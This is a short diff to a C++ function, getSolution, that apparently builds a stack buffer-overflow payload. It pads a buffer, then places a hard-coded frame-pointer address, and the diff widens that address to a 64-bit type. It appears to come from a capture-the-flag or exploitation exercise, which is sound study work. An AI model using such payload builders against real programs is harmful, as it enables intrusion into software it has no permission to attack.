@@ -28,7 +28,7 @@ string * getSolution(unsigned int addr){
 	getline(cin, input);
 	int filler = stoi(input, NULL, 10);
 	input = "";
-	unsigned int rbp = 0x7fffffffe818;
+	unsigned long rbp = 0x7fffffffe818;
 	cout << "Filler length = " << dec << filler << "\nrbp = " << hex << rbp << "\nAddr = " << hex << addr << endl;
 	char char_arr[filler+12];
 	for(int i=0; i<filler; i++){
